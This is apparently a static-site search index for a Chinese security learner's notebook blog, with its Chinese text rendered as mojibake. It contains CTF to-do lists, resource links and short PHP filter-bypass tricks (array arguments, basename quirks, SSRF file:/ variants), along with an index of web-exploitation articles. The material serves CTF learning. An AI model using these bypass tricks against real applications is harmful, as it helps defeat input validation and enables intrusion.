<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title></title>
    <url>/home/</url>
    <content><![CDATA[<figure class="highlight plain"><figcaption><span>wiki</span></figcaption><table><tr><td class="code"><pre><span class="line"> _____       ___   _____   ___   _   _        _____   _       _____   _____  </span><br><span class="line">&#x2F;  ___|     &#x2F;   | &#x2F;  _  \ |_  | | | | |      |  _  \ | |     &#x2F;  _  \ &#x2F;  ___| </span><br><span class="line">| |        &#x2F; &#x2F;| | | | | |   | | | |_| |      | |_| | | |     | | | | | |     </span><br><span class="line">| |       &#x2F; &#x2F; | | | |&#x2F;| |   | | |  _  |      |  _  | | |     | | | | | |  _  </span><br><span class="line">| |___   &#x2F; &#x2F;  | | | |_| |   | | | | | |      | |_| | | |___  | |_| | | |_| | </span><br><span class="line">\_____| &#x2F;_&#x2F;   |_| \_____&#x2F;   |_| |_| |_|      |_____&#x2F; |_____| \_____&#x2F; \_____&#x2F; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>ca01h@æ˜Ÿç›Ÿå®‰å…¨</strong></p>
<p>NTExOTY1NzM4QHFxLmNvbQ==</p>
</blockquote>
<p>äº’è”ç½‘æ—¶ä»£çš„çŸ¥è¯†æ˜¯é›¶æ•£çš„ï¼Œéœ€è¦æœ‰ä¸€ä¸ªå†™å­—çš„åœ°æ–¹ï¼ŒæŠŠé›¶æ•£çš„çŸ¥è¯†æ±‡èšèµ·æ¥ï¼Œä»¥ç‚¹è¿çº¿ï¼Œä»¥çº¿èšé¢ï¼Œä¸€æ–¹é¢èƒ½å½¢æˆä¸€ä¸ªå®Œæ•´çš„çŸ¥è¯†ä½“ç³»ï¼Œå¦ä¸€æ–¹é¢è‡ªå·±æ‰€éœ€ä¹‹æ—¶æ–¹ä¾¿æŸ¥é˜…ï¼Œäºæ˜¯ä¹å°±è¯ç”Ÿäº†<strong>ca01hã®ç¬”è®°æœ¬</strong>ã€‚</p>
<h2 id="TODO-LIST">TODO LIST</h2>
<h3 id="2020">2020</h3>
<p><strong>ã€æœªå®Œæˆã€‘SCTFå¤ç›˜ï¼š<a href="https://github.com/SycloverSecurity/SCTF2020/tree/master/Web">https://github.com/SycloverSecurity/SCTF2020/tree/master/Web</a></strong></p>
<p><strong>ã€æœªå®Œæˆã€‘<a href="https://bycsec.top/2020/08/05/Thinkphp-vuln/">Thinkphp-vuln</a></strong></p>
<h4 id="October">October</h4>
<ul>
<li>
<p><strong><s>ã€å·²å®Œæˆã€‘Yii2ååºåˆ—åŒ–POPé“¾åˆ†æ</s></strong></p>
</li>
<li>
<p><strong>ã€æœªå®Œæˆã€‘<a href="https://www.gem-love.com/ctf/2634.html#babyback">å·…å³°æå®¢Babybackå¤ç›˜</a></strong></p>
</li>
<li>
<p><strong>ã€æœªå®Œæˆã€‘DataConå¤ç›˜ï¼ˆé˜¶æ®µäºŒï¼‰</strong></p>
</li>
<li>
<p><strong>ã€æœªå®Œæˆã€‘æ˜Ÿç›Ÿå…¬å¼€è¯¾å‡†å¤‡å·¥ä½œ</strong></p>
</li>
<li>
<p><strong>ã€æœªå®Œæˆã€‘è®ºæ–‡å¼€é¢˜æŠ¥å‘Š</strong></p>
</li>
<li>
<p><s><strong>ã€å·²å®Œæˆã€‘xmctfå‡ºé¢˜</strong></s></p>
</li>
<li>
<p><strong>ã€æœªå®Œæˆã€‘CTFShowåˆ·é¢˜</strong></p>
</li>
<li>
<p><s><strong>ã€å·²å®Œæˆã€‘HTB Doctoré¶æœº</strong></s></p>
</li>
</ul>
<h4 id="September">September</h4>
<ul>
<li><s><strong>ã€å·²å®Œæˆã€‘å®ä¹ +HW</strong></s></li>
<li><s><strong>ã€å·²å®Œæˆã€‘DataConå¤ç›˜ï¼ˆé˜¶æ®µä¸€ï¼‰</strong></s></li>
<li><s><strong>ã€å·²å®Œæˆã€‘2020å·…å³°æå®¢CTF</strong></s></li>
</ul>
<h4 id="August">August</h4>
<ul>
<li><s><strong>ã€å·²å®Œæˆã€‘XCTFâ€”â€”WMCTF</strong>ï¼ˆæœ‰å¹¸åšäº†ä¸€ä¸ªç­¾åˆ°é¢˜</s></li>
<li><s><strong>ã€å·²å®Œæˆã€‘DataCon2020 DNSæ¶æ„æµé‡åˆ†æ</strong>ï¼ˆæœ‰å¹¸æ··äº†ä¸€ä¸ªé¼“åŠ±å¥–</s>
<ul>
<li>DNSæ¶æ„åŸŸååˆ†æ
<ul>
<li><a href="https://mp.weixin.qq.com/s/y0Wv5ci30HIhXp5bbCZxRg">https://mp.weixin.qq.com/s/y0Wv5ci30HIhXp5bbCZxRg</a></li>
</ul>
</li>
<li>åŠ å¯†æ¶æ„æµé‡æ£€æµ‹
<ul>
<li>åˆèµ›ï¼š<a href="https://s1mple.online/2020/08/09/DataCon2020-%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%88%9D%E8%B5%9B-Writeup-%E5%8F%8A%E6%80%BB%E7%BB%93%E5%8F%8D%E6%80%9D/">https://s1mple.online/2020/08/09/DataCon2020-åŠ å¯†æ¶æ„æµé‡æ£€æµ‹åˆèµ›-Writeup-åŠæ€»ç»“åæ€/</a></li>
</ul>
</li>
<li>åƒµå°¸ç½‘ç»œåˆ†æ
<ul>
<li>ç¬¬ä¸€é¢˜ï¼š<a href="https://www.cdxy.me/?p=829">https://www.cdxy.me/?p=829</a></li>
<li>ç¬¬ä¸‰é¢˜ï¼š<a href="https://zhuanlan.zhihu.com/p/186948840">https://zhuanlan.zhihu.com/p/186948840</a></li>
</ul>
</li>
<li>ç½‘ç»œé»‘äº§åˆ†æ</li>
<li>æ¶æ„ä»£ç åˆ†æ
<ul>
<li><a href="https://github.com/yuriufo/DataCon2020">https://github.com/yuriufo/DataCon2020</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/187535672">https://zhuanlan.zhihu.com/p/187535672</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/185715807">https://zhuanlan.zhihu.com/p/185715807</a></li>
</ul>
</li>
</ul>
</li>
<li><s><strong>ã€å·²å®Œæˆã€‘é¦–å±Šé’“é±¼åŸæ¯CTF</strong></s></li>
<li><s><strong>ã€å·²å®Œæˆã€‘HW</strong></s></li>
<li><s><strong>ã€å·²å®Œæˆã€‘<a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#htaccess">æ–‡ä»¶è§£ææ¼æ´</a></strong></s></li>
<li><strong>ã€æœªå®Œæˆã€‘ã€Šæœºå™¨å­¦ä¹ å®æˆ˜ã€‹å‰ä¸ƒç« </strong></li>
<li><s><strong>ã€å·²å®Œæˆã€‘BUUCTFåˆ·é¢˜</strong></s></li>
<li><strong>ã€æœªå®Œæˆã€‘HackTheBox OpenKeysï¼ˆè´¦å·åˆè¢«å°äº†ã€‚ã€‚ã€‚</strong></li>
<li><s><strong>ã€å·²å®Œæˆã€‘PHPæ„é€ ååºåˆ—åŒ–é“¾å†å­¦ä¹ </strong></s></li>
</ul>
<h4 id="July">July</h4>
<ul>
<li>
<p><s><strong>ã€å·²å®Œæˆã€‘ç¬¬äº”ç©ºé—´CTFå¤ç›˜</strong></s></p>
</li>
<li>
<p><s><strong>ã€å·²å®Œæˆã€‘DASCTFä¸ƒæœˆèµ›å¤ç›˜</strong></s></p>
</li>
<li>
<p><strong><s>ã€å·²å®Œæˆã€‘CSICTF2020å¤ç›˜</s></strong></p>
</li>
<li>
<p><s><strong>ã€å·²å®Œæˆã€‘2020ç”µä¿¡å¤©ç¿¼æ¯CTF</strong></s></p>
</li>
<li>
<p><strong>ã€æœªå®Œæˆã€‘SUCTF2019 Upload2</strong></p>
</li>
<li>
<p><strong>ã€æœªå®Œæˆã€‘N1CTF2018 Easy&amp;&amp;Hard PHP</strong></p>
<p><a href="https://xz.aliyun.com/t/2148">https://xz.aliyun.com/t/2148</a></p>
<p><a href="https://github.com/wonderkun/CTF_web/tree/master/web600-1?1520941487499">https://github.com/wonderkun/CTF_web/tree/master/web600-1?1520941487499</a></p>
</li>
<li>
<p><strong>ã€æœªå®Œæˆã€‘<a href="https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">Flask/Jinja2 SSTI &amp;&amp; Python æ²™ç®±é€ƒé€¸åŸºç¡€</a></strong></p>
</li>
<li>
<p>ã€<strong>æœªå®Œæˆã€‘<a href="https://www.smi1e.top/%E5%B0%8F%E5%AF%86%E5%9C%88%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%87%A0%E7%A7%8D%E5%8F%98%E5%BD%A2%E5%AD%A6%E4%B9%A0/">PHPå†™é…ç½®æ¼æ´</a></strong></p>
</li>
<li>
<p><strong>ã€æœªå®Œæˆã€‘<a href="https://www.smi1e.top/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8/">PHPå¼±ç±»å‹æ¯”è¾ƒ</a></strong></p>
</li>
<li>
<p><strong>ã€æœªå®Œæˆã€‘<a href="https://zeroyu.xyz/2020/06/04/Code-breaking-Puzzles-2018-Note">Code Breaking 2018æŒ‘æˆ˜èµ›å­¦ä¹ â€”â€”æ­£åˆ™å›æº¯</a></strong></p>
</li>
<li>
<p><s><strong>ã€å·²å®Œæˆã€‘HackTheBox Tabby</strong></s></p>
</li>
<li>
<p><s><strong>ã€å·²å®Œæˆã€‘HackTheBox Sneakymailer</strong></s></p>
</li>
<li>
<p><strong>ã€æœªå®Œæˆã€‘Flask Pinç å®‰å…¨</strong></p>
</li>
</ul>
<h4 id="June">June</h4>
<ul>
<li>
<p><s>ã€å·²å®Œæˆã€‘<strong>RCTF2020</strong></s>ï¼ˆè¢«å®Œè™ã€‚ã€‚ğŸ˜­çº¯ç²¹é ç€é˜Ÿé‡Œçš„pwnå¸ˆå‚…æŠ¬ç€èµ°)</p>
</li>
<li>
<p><s>ã€å·²å®Œæˆã€‘<strong>PHPååºåˆ—åŒ–â€”â€”Phar</strong></s></p>
</li>
<li>
<p><s>ã€å·²å®Œæˆã€‘<strong>PHPååºåˆ—åŒ–â€”â€”Session</strong></s></p>
</li>
<li>
<p>ã€æœªå®Œæˆã€‘<strong>æ–°æ˜¥æˆ˜å½¹ Hackme</strong>ï¼š<a href="https://www.mrkaixin.top/posts/df9f633e/#5-0-hackme">https://www.mrkaixin.top/posts/df9f633e/#5-0-hackme</a></p>
<ul>
<li><strong>filter_varç»•è¿‡</strong>ï¼š<a href="https://www.secpulse.com/archives/67064.html">https://www.secpulse.com/archives/67064.html</a></li>
<li><strong>ç»•è¿‡å››ä¸ªå­—ç¬¦é™åˆ¶getshell</strong>ï¼š<a href="https://www.anquanke.com/post/id/87203">https://www.anquanke.com/post/id/87203</a></li>
</ul>
</li>
<li>
<p><s>ã€å·²å®Œæˆã€‘<strong>PHPååºåˆ—åŒ–â€”â€”Soapclient</strong></s></p>
<ul>
<li><strong>LCTF bestphpâ€™s revenge</strong></li>
</ul>
</li>
<li>
<p><s>ã€æœªå®Œæˆã€‘<strong>PHPååºåˆ—åŒ–â€”â€”å­—ç¬¦é€ƒé€¸</strong></s></p>
</li>
<li>
<p>ã€æœªå®Œæˆã€‘<a href="https://yanmymickey.github.io/2020/04/14/CTF/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"><strong>PHPååºåˆ—åŒ–â€”â€”Bypass</strong></a></p>
</li>
<li>
<p><s>ã€æœªå®Œæˆã€‘<strong>ä»£ç å®¡è®¡å­¦ä¹ â€”â€”PHP-Audit-Code Day1-6</strong></s></p>
</li>
<li>
<p>ã€æœªå®Œæˆã€‘<a href="https://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/#GOPHER"><strong>phpinfoä¸­çš„å…³é”®ä¿¡æ¯</strong></a></p>
</li>
<li>
<p>ã€æœªå®Œæˆã€‘<strong>Rediså®‰å…¨å­¦ä¹ </strong></p>
</li>
<li>
<p><s>ã€å·²å®Œæˆã€‘<strong>BUUCTFåˆ·é¢˜</strong></s></p>
</li>
<li>
<p><s>ã€å·²å®Œæˆã€‘<strong>XMCTFè§£é¢˜</strong></s></p>
</li>
<li>
<p><s>ã€å·²å®Œæˆã€‘<strong>ç¬¬äº”ç©ºé—´CTFæ¯”èµ›ï¼ˆ2020.06.24ï¼‰</strong>ï¼ˆèœå°±ä¸€ä¸ªå­—ã€‚ã€‚ã€‚ï¼‰</s></p>
</li>
<li>
<p><s>ã€å·²å®Œæˆã€‘<strong>é˜Ÿå†…AWDè®­ç»ƒèµ›ï¼ˆ2020.06.28ï¼‰</strong></s></p>
</li>
</ul>
<h2 id="Awesome-Articals-Projects">Awesome Articals/Projects</h2>
<h3 id="Linuxå…¥ä¾µæ£€æµ‹">Linuxå…¥ä¾µæ£€æµ‹</h3>
<p><a href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p>
<h3 id="çº¢è“å¯¹æŠ—">çº¢è“å¯¹æŠ—</h3>
<p><a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a></p>
<p><a href="https://github.com/hudunkey/Red-Team-links">https://github.com/hudunkey/Red-Team-links</a></p>
<h3 id="ä»£ç å®¡è®¡">ä»£ç å®¡è®¡</h3>
<p><a href="https://github.com/CHYbeta/Code-Audit-Challenges">https://github.com/CHYbeta/Code-Audit-Challenges</a></p>
<p><a href="https://github.com/hongriSec/PHP-Audit-Labs">https://github.com/hongriSec/PHP-Audit-Labs</a></p>
<h3 id="WAF">WAF</h3>
<p><a href="https://wh0ale.github.io/2019/12/04/waf%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0Bypass/">https://wh0ale.github.io/2019/12/04/wafä»å…¥é—¨åˆ°Bypass/</a></p>
<p><a href="https://weibo.com/ttarticle/p/show?id=2309404007261092631700#_loginLayer_1579837230756">https://weibo.com/ttarticle/p/show?id=2309404007261092631700#_loginLayer_1579837230756</a></p>
<h3 id="javaå®‰å…¨">javaå®‰å…¨</h3>
<p><a href="https://github.com/threedr3am/learnjavabug">https://github.com/threedr3am/learnjavabug</a></p>
<h3 id="Pythonå®‰å…¨">Pythonå®‰å…¨</h3>
<p><a href="https://github.com/bit4woo/python_sec">https://github.com/bit4woo/python_sec</a></p>
<h3 id="å­—å…¸">å­—å…¸</h3>
<p><a href="https://github.com/insightglacier/Dictionary-Of-Pentesting">https://github.com/insightglacier/Dictionary-Of-Pentesting</a></p>
<h3 id="æ±‚èŒ">æ±‚èŒ</h3>
<p><a href="https://github.com/geekcompany/ResumeSample">https://github.com/geekcompany/ResumeSample</a></p>
<p><a href="https://github.com/zhaoweiho/web-sec-interview">https://github.com/zhaoweiho/web-sec-interview</a></p>
<p><a href="https://github.com/EvilAnne/Pentest_questions">https://github.com/EvilAnne/Pentest_questions</a></p>
<h2 id="Bypass-Tricks">Bypass &amp; Tricks</h2>
<h3 id="PHP">PHP</h3>
<h4 id="preg-matchç»•è¿‡">preg_matchç»•è¿‡</h4>
<blockquote>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">https://www.cnblogs.com/20175211lyz/p/12198258.html</a></p>
</blockquote>
<ul>
<li>æ•°ç»„ç»•è¿‡</li>
<li>PCREå›æº¯é™åˆ¶ï¼ˆcode-breaking2018ï¼‰</li>
<li>æ¢è¡Œç¬¦</li>
</ul>
<h4 id="PHPå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡">PHPå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡</h4>
<blockquote>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p>
</blockquote>
<p>å€Ÿç”¨ä¸€å¼ å›¾ç®€å•åœ°è®°ä¸€ä¸‹</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708203746.png" alt=""></p>
<h4 id="SSRF-fileåè®®ç»•è¿‡">SSRF fileåè®®ç»•è¿‡</h4>
<p>å¦‚æœSSRFä¸­<code>file://</code>å…³é”®å­—è¢«ç¦ç”¨ï¼Œå¯ä»¥ä½¿ç”¨<code>file:/</code>æˆ–è€…<code>file:///</code>æ¥ä»£æ›¿ã€‚</p>
<p>ä¾‹é¢˜ï¼š<a href="https://buuoj.cn/challenges#%5BGKCTF2020%5DEZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb">[GKCTF2020]EZä¸‰å‰‘å®¢-EzWeb</a></p>
<h4 id="Sessionç»•è¿‡">Sessionç»•è¿‡</h4>
<p>åˆ é™¤cookieï¼Œæ²¡æœ‰cookieä¸­çš„SESSIONIDå°±æ‰¾ä¸åˆ°å¯¹åº”çš„sessionæ–‡ä»¶ï¼Œç›¸åº”çš„<code>$_SESSION['var']</code>å°±ä¸ºNULLï¼Œç›¸å½“äºä¼ å‚NULLã€‚</p>
<p>ä¾‹é¢˜ï¼š<a href="https://buuoj.cn/challenges#%5BBJDCTF%202nd%5D%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B">BJDCTF2nd æ–‡ä»¶æ¢æµ‹</a></p>
<h4 id="åˆ©ç”¨æ•°ç»„ç»•è¿‡">åˆ©ç”¨æ•°ç»„ç»•è¿‡</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">md5(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">sha1(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">ereg(pattern,<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">preg_match(pattern,<span class="keyword">Array</span>()) = <span class="literal">false</span></span><br><span class="line">strcmp(<span class="keyword">Array</span>(), <span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strpos(<span class="keyword">Array</span>(),<span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strlen(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br></pre></td></tr></table></figure>
<p>ä¾‹é¢˜ï¼š<a href="https://buuoj.cn/challenges#%5B0CTF%202016%5Dpiapiapia">0CTF2016 piapiapia</a></p>
<h4 id="basenameç»•è¿‡">basenameç»•è¿‡</h4>
<p>ä» <a href="https://bugs.php.net/bug.php?id=62119">https://bugs.php.net/bug.php?id=62119</a> æ‰¾åˆ°äº†<code>basename()</code>å‡½æ•°çš„ä¸€ä¸ªé—®é¢˜ï¼Œå®ƒä¼šå»æ‰æ–‡ä»¶åå¼€å¤´çš„éASCIIå€¼ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(basename(<span class="string">&quot;xffconfig.php&quot;</span>)); <span class="comment">// =&gt; config.php</span></span><br><span class="line">var_dump(basename(<span class="string">&quot;config.php/xff&quot;</span>)); <span class="comment">// =&gt; config.php</span></span><br></pre></td></tr></table></figure>
<p>ä¾‹é¢˜ï¼š<a href="https://buuoj.cn/challenges#%5BZer0pts2020%5DCan%20you%20guess%20it?">[Zer0pts2020]Can you guess it?</a></p>
<h4 id="htaccessåˆ©ç”¨">.htaccessåˆ©ç”¨</h4>
<p><a href="https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks%E6%80%BB%E7%BB%93">https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricksæ€»ç»“</a></p>
]]></content>
  </entry>
  <entry>
    <title>menu</title>
    <url>/menu/</url>
    <content><![CDATA[<h1 id="æ–‡ç« å½’æ¡£"><a href="/archives/index.html"><strong>æ–‡ç« å½’æ¡£</strong></a></h1>
<h1 id="ç½®é¡¶æ–‡ç« "><strong>ç½®é¡¶æ–‡ç« </strong></h1>
<ul>
<li><a href="/Other/6.Linux-Enumeration">Linux Enumeration</a></li>
</ul>
<h1 id="Webå®‰å…¨"><strong>Webå®‰å…¨</strong></h1>
<h2 id="Webå®‰å…¨åŸºç¡€">Webå®‰å…¨åŸºç¡€</h2>
<ul>
<li><a href="/Web_security/basic_learning/1.%E5%9C%A8Ubuntu18.04%E5%AE%89%E8%A3%85LNMP">åœ¨Ubuntu18.04å®‰è£…LNMP</a></li>
<li><a href="/Web_security/basic_learning/2.MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">MySQLæ•°æ®åº“åŸºæœ¬æ“ä½œ</a></li>
<li><a href="/Web_security/basic_learning/3.MySQL%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%A1%A8%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%92%8CHash%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4">MySQLçš„ç³»ç»Ÿè¡¨ã€æ–‡ä»¶è¯»å†™</a></li>
<li><a href="/Web_security/basic_learning/4.%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0">æ•°æ®åº“ç³»ç»ŸåŠŸèƒ½ç›¸å…³å­¦ä¹ </a></li>
<li><a href="/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0">æ•°æ®åº“æ³¨å…¥è¯­å¥çš„æ”¶é›†å’Œå­¦ä¹ </a></li>
<li><a href="/Web_security/basic_learning/6.Web%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0">Webé¡µé¢è§£æçš„æµç¨‹å­¦ä¹ </a></li>
<li><a href="/Web_security/basic_learning/7.%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99">å„ç§æ³¨å…¥ç±»å‹çš„ç¯å¢ƒæ­å»ºå’Œä»£ç ç¼–å†™</a></li>
<li><a href="/Web_security/basic_learning/9.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Basic-Challenge">Sqli-labsæ‰‹å·¥æ³¨å…¥(ä¸€)</a></li>
<li><a href="/Web_security/basic_learning/8.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Advanced-Injections">Sqli-labsæ‰‹å·¥æ³¨å…¥(äºŒ)</a></li>
<li><a href="/Web_security/basic_learning/10.SQLMap%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0">SQLMapå…¥é—¨å­¦ä¹ </a></li>
<li><a href="/Web_security/basic_learning/11.SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">SQLæ³¨å…¥â€”â€”åŒæŸ¥è¯¢æ³¨å…¥</a></li>
<li><a href="/Web_security/basic_learning/12.XSS%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0">XSSæ¼æ´å®æˆ˜å­¦ä¹ </a></li>
<li><a href="/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨</a></li>
<li><a href="/Web_security/basic_learning/14.%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">å˜é‡è¦†ç›–æ¼æ´åˆ©ç”¨</a></li>
<li><a href="/Web_security/basic_learning/16.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ©ç”¨</a></li>
<li><a href="/Web_security/basic_learning/17.SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">SSRFæ¼æ´åˆ©ç”¨</a></li>
<li><a href="/Web_security/basic_learning/18.%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨</a></li>
<li><a href="/Web_security/basic_learning/19.%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">é€»è¾‘æ¼æ´åˆ©ç”¨</a></li>
<li><a href="/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">XXEæ¼æ´åˆ©ç”¨</a></li>
<li><a href="/Web_security/basic_learning/21.NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB">NoSQLæ³¨å…¥ä¹‹MongoDB</a></li>
<li><a href="/Web_security/basic_learning/22.SQL%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E4%B9%8BMySQL%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95">SQLæ³¨å…¥ä¸“é¡¹ä¹‹MySQLåŸºæœ¬æ³¨å…¥è¯­æ³•</a></li>
<li><a href="/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">æµ…è°ˆLDAPæ³¨å…¥æ”»å‡»</a></li>
</ul>
<h2 id="PHPç›¸å…³">PHPç›¸å…³</h2>
<ul>
<li><a href="/Web_security/php_related/1.PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8">PHPå›è°ƒåé—¨</a></li>
<li><a href="/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87">PHPååºåˆ—åŒ–â€”â€”åŸºç¡€ç¯‡</a></li>
<li><a href="/Web_security/php_related/3.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHPååºåˆ—åŒ–â€”â€”Phar</a></li>
<li><a href="/Web_security/php_related/4.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHPååºåˆ—åŒ–â€”â€”Session</a></li>
<li><a href="/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8">PHPååºåˆ—åŒ–-åŸç”Ÿç±»åˆ©ç”¨</a></li>
<li><a href="/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell">PHPæ— æ•°å­—å­—æ¯æ„é€ webshell</a></li>
<li><a href="/Web_security/php_related/9.%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8">PHPæ— å‚æ•°å‡½æ•°çš„åˆ©ç”¨</a></li>
<li><a href="/Web_security/php_related/10.%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB">SoapClient+SSRF+CRLFåˆ©ç”¨</a></li>
<li><a href="/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">PHP LFI to RCE</a></li>
<li><a href="/Web_security/php_related/13.session.upload-progress+LFI%E5%AE%9E%E7%8E%B0RCE">session.upload-progress+LFIå®ç°RCE</a></li>
</ul>
<h2 id="Writeups">Writeups</h2>
<ul>
<li><a href="/Web_security/ctf_writeup/3.CGCTF-Writeup">CGCTF-Writeup</a></li>
<li><a href="/Web_security/ctf_writeup/4.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">BUUCTFâ€”PHPä»£å®¡</a></li>
<li><a href="/Web_security/ctf_writeup/5.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E7%AF%87">BUUCTFâ€”PHPæ¡†æ¶æ¼æ´</a></li>
<li><a href="/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">BUUCTFâ€”PHPååºåˆ—åŒ–</a></li>
<li><a href="/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5">BUUCTFâ€”SQLæ³¨å…¥</a></li>
<li><a href="/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS">BUUCTFâ€”XSS</a></li>
